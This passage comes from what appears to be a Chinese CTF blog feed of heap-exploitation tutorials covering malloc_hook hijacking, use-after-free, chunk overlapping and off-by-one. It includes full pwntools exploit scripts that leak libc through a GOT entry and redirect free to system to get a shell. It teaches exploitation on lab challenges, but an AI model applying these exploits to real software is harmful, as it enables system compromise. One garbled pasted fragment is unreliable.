class="comment">   malloc_set_state than will returning blocks not adequately aligned for</span></span><br><span class="line"><span class="comment">   long double objects under -mlong-double-128.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> MALLOC_ALIGNMENT       (2 *SIZE_SZ &lt; __alignof__ (long double)      \</span></span><br><span class="line"><span class="meta">                                  ? __alignof__ (long double) : 2 *SIZE_SZ)</span></span><br><span class="line"><span class="meta"># <span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> MALLOC_ALIGNMENT       (2 *SIZE_SZ)</span></span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* The corresponding bit mask value */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MALLOC_ALIGN_MASK      (MALLOC_ALIGNMENT - 1)</span></span><br></pre></td></tr></table></figure><h3 id="malloc-hook函数解析"><a href="#malloc-hook函数解析" class="headerlink" title="malloc_hook函数解析"></a>malloc_hook函数解析</h3><p>malloc_hook是malloc的钩子函数，在执行malloc时，会先检测__malloc_hook的值，如果malloc_hook的值存在，则执行该地址（值里边表现为十六进制，可以成为地址），也就是说，如果我们成功劫持malloc_hook以后并修改它的值为one_gadget，我们就能getshell<br>并且在加入tcache之后，不会对大小进行检测，使我们更好利用它</p><h3 id="利用范围"><a href="#利用范围" class="headerlink" title="利用范围"></a>利用范围</h3><p><strong>版本:Ubuntu18（加入了tcache，无需伪造size）—Ubuntu20.04</strong><br>因为<strong>22.04删去了几乎所有的钩子函数</strong>，使得劫持hook成为了不可能，所以它的试用范围仅限于20.04之前，在未来应该会销声匿迹</p><p>它在学堆之后估计就是我们的老朋友的，我们<strong>常常能在堆题里看见并利用它</strong>，与<strong>free_hook和relloc_hook</strong>简直是三兄弟</p><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p><strong>修改chunk-&gt;fd指向malloc_hook</strong>，然后把malloc_hook申请出来<strong>成为fake_chunk</strong>，再<strong>修改fake_chunk的值为one_gadget</strong>。修改完毕后记得<strong>校准one_gadget</strong>，有可能无法生效，毕竟可能不满足one_gadget的生效条件</p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> 堆 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>UAF(use_after_free)</title>
      <link href="/2025/03/10/UAF-use-after-free/"/>
      <url>/2025/03/10/UAF-use-after-free/</url>
      
        <content type="html"><![CDATA[<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>我们将Use After Free翻译过来就是释放后使用：当一个指针所指向的指针块被释放掉之后可以再次被使用，<br>但是这是由要求的，不妨将所有的情况列举出来：</p><ul><li><strong>chunk被释放之后，其对应的指针被设置为NULL</strong>，如果再次使用它，程序就会崩溃。</li><li><strong>chunk被释放之后，其对应的指针未被设置为NULL</strong>，如果在下一次使用之前没有代码对这块内存进行修改，那么再次使用这个指针时程序很有可能正常运转。</li><li><strong>内存块被释放后，其对应的指针没有被设置为NULL</strong>，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，就很有可能会出现奇怪的问题。<br>在堆中Use After Free一般指的是后两种漏洞，我们<strong>一般称<em>被释放后没有被设置为NULL的内存指针</em>为dangling pointer(悬空指针、悬垂指针)</strong>。<blockquote><p>未被初始化过的内存指针称为野指针</p></blockquote></li></ul><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p><img src="/2025/03/10/UAF-use-after-free/Pasted image 20250309202934.png" alt="Pasted image 20250309202934"><br><img src="/2025/03/10/UAF-use-after-free/Pasted image 20250309222453.png" alt="Pasted image 20250309222453"><br><img src="/2025/03/10/UAF-use-after-free/Pasted image 20250309222509.png" alt="Pasted image 20250309222509"></p><p>delete函数未将指针置空，存在UAF漏洞</p><p><img src="/2025/03/10/UAF-use-after-free/image-20250404130558440.png" alt="image-20250404130558440"></p><p>因为free chunk之后没有将ptr = null</p><p><img src="/2025/03/10/UAF-use-after-free/image-20250404132313542.png" alt="image-20250404132313542"></p><p><img src="/2025/03/10/UAF-use-after-free/image-20250404132339096.png" alt="image-20250404132339096"></p><p>释放两个chunk后, tcache中会有两个0x10大小的chunk, 再申请8字节的chunk, 会返回两个chunk, 后一个chunk就是之前的chunk0, 写入后门函数就会覆盖原chunk0的函数地址print_note, 新生成的note不是chunk0, 而是chunk3, 本题的UAF是指释放chunk0后, 又使用了chunk0</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">r = process(<span class="string">&#x27;./hacknote&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">addnote</span>(<span class="params">size, content</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delnote</span>(<span class="params">idx</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printnote</span>(<span class="params">idx</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">magic = <span class="number">0x08048986</span></span><br><span class="line"> </span><br><span class="line">addnote(<span class="number">20</span>, <span class="string">&quot;note1&quot;</span>) <span class="comment"># add note 0</span></span><br><span class="line">addnote(<span class="number">20</span>, <span class="string">&quot;note2&quot;</span>) <span class="comment"># add note 1</span></span><br><span class="line"> </span><br><span class="line">delnote(<span class="number">0</span>) <span class="comment"># delete note 0</span></span><br><span class="line">delnote(<span class="number">1</span>) <span class="comment"># delete note 1</span></span><br><span class="line"> </span><br><span class="line">addnote(<span class="number">8</span>, p32(magic)) <span class="comment"># add note 2</span></span><br><span class="line"> </span><br><span class="line">printnote(<span class="number">0</span>) <span class="comment"># print note 0</span></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> 堆 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>chunk_extend</title>
      <link href="/2025/03/10/chunk-extend/"/>
      <url>/2025/03/10/chunk-extend/</url>
      
        <content type="html"><![CDATA[<h2 id="Chunk-Extend-and-Overlapping"><a href="#Chunk-Extend-and-Overlapping" class="headerlink" title="Chunk Extend and Overlapping"></a>Chunk Extend and Overlapping</h2><p><code>chunk extend</code>是堆漏洞的一种常见利用手法，通过 <code>extend</code>可以实现 <code>chunk overlapping</code>的效果。这种利用方法需要以下的时机和条件：</p><ul><li>程序中存在基于堆的漏洞</li><li>漏洞可以控制 chunk header 中的数据，如修改size</li></ul><h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/chunk-extend-shrink/hitcontraning_lab13">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/chunk-extend-shrink/hitcontraning_lab13</a></p><p>我们可以先创建2个堆块看看功能</p><p>xxxxxxxxxx6 1size_t fread(void <em>ptr, size_t size, size_t nmemb, FILE </em>stream)2​3ptr – 这是指向带有最小尺寸 size*nmemb 字节的内存块的指针4size – 这是要读取的每个元素的大小，以字节为单位5nmemb – 这是元素的个数，每个元素的大小为 size 字节6stream – 这是指向 FILE 对象的指针，该 FILE 对象指定了一个输入流C</p><p><img src="/2025/03/10/chunk-extend/image-20250403205513286.png" alt="image-20250403205513286"></p><p><img src="/2025/03/10/chunk-extend/image-20250403210537691.png" alt="image-20250403210537691"></p><p><code>edit</code>有<code>off-by-one</code></p><p><code>edit heap0 -&gt;content</code>可以修改<code>heap1</code>的<code>size</code></p><p><img src="/2025/03/10/chunk-extend/image-20250403210457105.png" alt="image-20250403210457105"></p><p><img src="/2025/03/10/chunk-extend/image-20250403211036200.png" alt="image-20250403211036200"></p><p>通过释放<code>heap_1</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">edit(<span class="number">0</span>, <span class="string">&quot;/bin/sh\x00&quot;</span> + <span class="string">&quot;a&quot;</span> * <span class="number">0x10</span> + <span class="string">&quot;\x41&quot;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p><img src="/2025/03/10/chunk-extend/image-20250403212553677.png" alt="image-20250403212553677"></p><p>先<code>free heap1-&gt;content</code>，再<code>free heap1</code>的结构块</p><p><img src="/2025/03/10/chunk-extend/image-20250403211524923.png" alt="image-20250403211524923"></p><p>此时<code>0x40</code>的链表上已经有extend后的块了</p><p><img src="/2025/03/10/chunk-extend/image-20250403211714597.png" alt="image-20250403211714597"></p><p>此时如果我们再申请一个<code>content_size</code>为<code>0x30</code>的堆块，将启用<code>fastbins</code>中一个<code>0x20</code>作为<code>new_heap1</code>的结构块，以及<code>0x40</code>的作为<code>new_heap1</code>的<code>content</code>块。</p><p>此时，形成了一个结构块被内容块吃掉的局面</p><p><img src="/2025/03/10/chunk-extend/image-20250403213502584.png" alt="image-20250403213502584"></p><p>改前</p><p><img src="/2025/03/10/chunk-extend/image-20250403220105397.png" alt="image-20250403220105397"></p><p>由于我们可以通过<code>edit</code>修改<code>heap</code>的<code>content</code>，相当于我们可以伪造<code>new_heap</code>的结构块</p><p>改后，<code>0x602018</code>即为<code>free_got</code></p><p><img src="/2025/03/10/chunk-extend/image-20250403215731291.png" alt="image-20250403215731291"></p><p>在show中<img src="/2025/03/10/chunk-extend/image-20250403213643448.png" alt="image-20250403213643448"></p><p>会显示结构块中<code>content</code>指针变量，如果把这个指针覆盖为<code>free_got</code>指针，再<code>show</code>，就可以得到<code>free</code>函数的真实地址，从而成功泄露<code>libc</code></p><p>此时<code>edit new_heap1</code>的话，由于<code>content</code>的指针被改了，<code>edit</code>会跟着<code>free_got</code>中的地址，我们可以把他改成别的函数地址，当执行<code>free</code>时，会转而执行我们所希望的函数，例如<code>system</code></p><p><code>heap0</code>的内容块又是<code>binsh</code>，直接<code>getshell</code></p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">p=process(<span class="string">&#x27;./heapcreator&#x27;</span>)</span><br><span class="line">heap = ELF(<span class="string">&#x27;./heapcreator&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>, content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>, content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x18</span>, <span class="string">&quot;hollk&quot;</span>)  </span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">&quot;hollk&quot;</span>)  </span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">&quot;/bin/sh\x00&quot;</span> + <span class="string">&quot;a&quot;</span> * <span class="number">0x10</span> + <span class="string">&quot;\x41&quot;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x30</span>, p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x21</span>) + p64(<span class="number">0x30</span>) + p64(heap.got[<span class="string">&#x27;free&#x27;</span>]))  </span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Content : &quot;</span>)</span><br><span class="line">data = p.recvuntil(<span class="string">&quot;Done !&quot;</span>)</span><br><span class="line"></span><br><span class="line">free_addr = u64(data.split(<span class="string">b&quot;\n&quot;</span>)[<span class="number">0</span>].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">libc_base = free_addr - libc.symbols[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;libc base addr: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, p64(system_addr))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>堆中的off-by-one</title>
      <link href="/2025/03/09/%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/"/>
      <url>/2025/03/09/%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>off-by-one这种技术不仅仅适用于堆，在栈溢出中也可以得到很好的应用，由于ctf很喜欢在堆中出题。严格来说off-by-one漏洞是一种特殊的溢出漏洞，off-by-one指程序向缓冲区中写入时，写入的字节数超过了这个缓冲区本身所申请的字节数并且只越界了一个字节</p><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>off-by-one这种漏洞的形成和整形溢出很相似，往往都是由于对边界的检查不够严谨，当然也不排除和写入的size正好就只多了一个字节的情况，边界验证不严谨通常有两种情况：</p><ul><li>使用循环语句向堆块中写入数据时，循环的次数设置错误，导致多写了一个字节，后面会举例讲解</li><li>对字符串长度判断有误<h3 id="简例"><a href="#简例" class="headerlink" title="简例"></a>简例</h3><h4 id="1-循环边界不严谨"><a href="#1-循环边界不严谨" class="headerlink" title="1.循环边界不严谨"></a>1.循环边界不严谨</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">int</span> my_gets(char *ptr,<span class="built_in">int</span> size)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt;= size; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        ptr[i] = getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">int</span> main()</span><br><span class="line">&#123;</span><br><span class="line">    char *chunk1,*chunk2;</span><br><span class="line">    chunk1 = (char *)malloc(<span class="number">16</span>);</span><br><span class="line">    chunk2 = (char *)malloc(<span class="number">16</span>);</span><br><span class="line">    puts(<span class="string">&quot;Get Input:&quot;</span>);</span><br><span class="line">    my_gets(chunk1, <span class="number">16</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-对字符串长度判断有误"><a href="#2-对字符串长度判断有误" class="headerlink" title="2.对字符串长度判断有误"></a>2.对字符串长度判断有误</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">int</span> main(void)</span><br><span class="line">&#123;</span><br><span class="line">    char buffer[<span class="number">40</span>]=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    void *chunk1;</span><br><span class="line">    chunk1=malloc(<span class="number">24</span>);</span><br><span class="line">    puts(<span class="string">&quot;Get Input&quot;</span>);</span><br><span class="line">    gets(buffer);</span><br><span class="line">    <span class="keyword">if</span>(strlen(buffer)==<span class="number">24</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        strcpy(chunk1,buffer);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>还是讲一下这个 例子的流程，首先创建了一个40字节的字符串buffer，然后又创建了一个24字节的堆chunk1。接着从外部接收字符串并存放在字符串buffer中，然后判断buffer中的字符串的长度是否为24个字节，如果是将这段字符串放在堆中。其实乍一看来并没有什么问题，但是有一个隐形的东西，就是结束符\x00。<code>strcpy函数在拷贝的时候也会将结束符\x00存入堆块中</code>，也就是说我们想chunk1中一共写了25个字节，这就导致了chunk1溢出了一个字节<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/off_by_one/Asis_2016_b00ks">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/off_by_one/Asis_2016_b00ks</a><br><img src="/2025/03/09/%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/Pasted image 20250306141645.png" alt="Pasted image 20250306141645"></li></ul><p>sub_9F5<br><img src="/2025/03/09/%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/Pasted image 20250306150505.png" alt="Pasted image 20250306150505"><br><img src="/2025/03/09/%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/Pasted image 20250306150525.png" alt="Pasted image 20250306150525"><br><img src="/2025/03/09/%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/Pasted image 20250306150445.png" alt="Pasted image 20250306150445"><br><img src="/2025/03/09/%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/Pasted image 20250306144232.png" alt="Pasted image 20250306144232"><br>关键点</p><ul><li>作者名存放在off_202018指针中，这个指针一共32个字节</li><li>图书结构体指针存放在off_202010指针中</li><li>sub_9F5()函数存在off-by-one漏洞，在首次创建作者名或修改作者名的时候，如果填写32个字节的字符串，那么就会导致\x00溢出到off_202018的低位</li></ul><p>输入任意32个字节的字符串将存放作者名的off_202018空间填满<br>将代码段起始地址加上off_202018的偏移就可以得到存放作者名地址的指针了：<br><img src="/2025/03/09/%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/Pasted image 20250306191120.png" alt="Pasted image 20250306191120"></p><p>可以看到0x55555575602010中存放的就是图书1的结构体指针，紧跟着的就是图书2的结构体指针。还有一点需要注意的是我们输入的作者名也紧紧地贴在两个结构体指针前面，这是因为存放这两个东西的off_202010和off_202018是挨着的<br><img src="/2025/03/09/%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/Pasted image 20250306202108.png" alt="Pasted image 20250306202108"><br>由于作者名和book1结构体相连，所以事实上book1结构体指针的低位30将原有作者名溢出的\x00覆盖掉了。那么我们如果打印作者名，最后的\x00也是要输出的，但是被e0覆盖之后e0也会被打印，由于e0是book1结构体指针的起始位置，那么book1结构体指针也会被一起打印出来。<br>举个栗子：两张扑克牌A、B，牌A放在桌子上，牌B的边缘涂上胶水，接着将牌B有胶水的一面边缘放在牌A的边缘使两张牌黏在一起，最后从桌子上拿起牌A，由于A与B粘合的原因，牌B也会跟着被从桌子上拿起</p><p>book1的结构体指针:<code>0x0000555555a02130</code><br><img src="/2025/03/09/%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/Pasted image 20250306204104.png" alt="Pasted image 20250306204104"></p><p>既然book1的结构体指针低位能够覆盖作者名的\x00，那么作者名的\x00是不是也能够覆盖结构体指针的低位呢？正好这个程序还有修改作者名的功能，而且在前面ida分析的时候发现新的作者名依然还会存放在202018的位置。那么我们预想一下book1的结构体指针是0x0000555555a020e0那么被覆盖之后就会变成0x0000555555a02000</p><p><img src="/2025/03/09/%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/Pasted image 20250306205146.png" alt="Pasted image 20250306205146"><br>可以看到book1原有的结构体指针0x0000555555a020e0被\x00覆盖成了0x0000555555a02000，现在拿出你的记事本，0x0000555555a020b0的位置就是刚才book1_desc的位置，这也是为什么要将book1_name设置成128的原因。那么我们去想想一想，调用一本书的流程：首先是和图书id对应着图书的结构体指针，结构体指针对应着结构体，结构体带动其中的成员变量。那么上图我们通过\x00覆盖之后原有的结构体指针变成了0x0000555555a020b0，那么程序就会去0x0000555555a020b0的位置寻找结构体。如果我们在原有的book1的book1_desc的位置伪造一个结构体，然后在进行\xb0覆盖，那么就把伪造的结构体当做book1来实现：</p><p><img src="/2025/03/09/%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/Pasted image 20250306211151.png" alt="Pasted image 20250306211151"></p><p>book1=0x0000555555a02130<br><img src="/2025/03/09/%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/Pasted image 20250306211606.png" alt="Pasted image 20250306211606"></p><ul><li>book2_name-book1_addr=0x555555a02168-0x0000555555a02130=0x38</li><li>book2_desc - book1_addr = 0x0000555555a02170 - 0x0000555555a02130 = 0x40 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = p64(1) + p64(book1_addr + 0x38) + p64(book1_addr + 0x40) + p64(0xffff)</span><br></pre></td></tr></table></figure>我们部署好结构体之后还需要重新修改一下作者名，因为我们的结构体是写在原book1_desc中的，所以按照攻击流程上来说应该先部署伪造的结构体，然后再使用<code>\x00</code>覆盖book1结构体指针，使指针指向我们伪造的结构体</li></ul><p>这样一来我们按<code>c</code>回到程序执行流程，先修改作者名，然后再次执行打印功能，就会将book2_name和book2_desc打印出来了：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">book1_addr = <span class="number">0x555555757730</span></span><br><span class="line">payload = p64(<span class="number">1</span>) + p64(book1_addr + <span class="number">0x38</span>) + p64(book1_addr + <span class="number">0x40</span>) + p64(<span class="number">0xffff</span>)</span><br><span class="line">editbook(book_id_1, payload)</span><br><span class="line">changename(<span class="string">&quot;hollkaaabbbbbbbbccccccccdddddddd&quot;</span>)</span><br><span class="line">book_id_1, book_name, book_des, book_author = printbook(<span class="number">1</span>)</span><br><span class="line">book2_name_addr = u64(book_name.ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">book2_des_addr = u64(book_des.ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;info&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">p=process(<span class="string">&#x27;./b00ks&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/zechariah/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_book</span>(<span class="params">name_size, name, des_size, des</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;name size: &#x27;</span>, <span class="built_in">str</span>(name_size))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;chars): &#x27;</span>, name)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;description size: &#x27;</span>, <span class="built_in">str</span>(des_size))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;description: &#x27;</span>, des)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete_book</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;delete: &#x27;</span>, <span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit_book</span>(<span class="params"><span class="built_in">id</span>,new_des</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;edit: &#x27;</span>, <span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;description: &#x27;</span>, new_des)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_book</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">id</span>):</span><br><span class="line">        book_id=<span class="built_in">int</span>(p.recvline()[:-<span class="number">1</span>])</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">        book_name=p.recvline()[:-<span class="number">1</span>]</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">        book_des=p.recvline()[:-<span class="number">1</span>]</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">        book_author=p.recvline()[:-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> book_id,book_name,book_des,book_author</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_author</span>(<span class="params">author_name</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;name: &#x27;</span>,author_name)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">createname</span>(<span class="params">name</span>):</span><br><span class="line">        p.readuntil(<span class="string">&quot;name: &quot;</span>)</span><br><span class="line">        p.sendline(name)</span><br><span class="line"></span><br><span class="line">createname(<span class="string">&quot;hollkaaabbbbbbbbccccccccdddddddd&quot;</span>)</span><br><span class="line">create_book(<span class="number">208</span>,<span class="string">&#x27;Zechariah&#x27;</span>,<span class="number">32</span>,<span class="string">&#x27;Zechariah_des1&#x27;</span>)//根据实际计算</span><br><span class="line">create_book(<span class="number">0x21000</span>,<span class="string">&#x27;Zechariah&#x27;</span>,<span class="number">0x21000</span>,<span class="string">&#x27;Zechariah_des2&#x27;</span>)</span><br><span class="line">book_id,book_name,book_des,book_author=print_book(<span class="number">1</span>)</span><br><span class="line">book1_addr=u64(book_author[<span class="number">32</span>:<span class="number">32</span>+<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;book1_addr: &quot;</span>+<span class="built_in">hex</span>(book1_addr))</span><br><span class="line">payload = p64(<span class="number">1</span>) + p64(book1_addr + <span class="number">0x38</span>) + p64(book1_addr + <span class="number">0x40</span>) + p64(<span class="number">0xffff</span>)</span><br><span class="line">edit_book(<span class="number">1</span>, payload)</span><br><span class="line">change_author(<span class="string">&quot;hollkaaabbbbbbbbccccccccdddddddd&quot;</span>)</span><br><span class="line">book_id, book_name, book_des, book_author = print_book(<span class="number">1</span>)</span><br><span class="line">book2_name_addr = u64(book_name.ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">book2_des_addr = u64(book_des.ljust(<span class="number">8</span>,<span 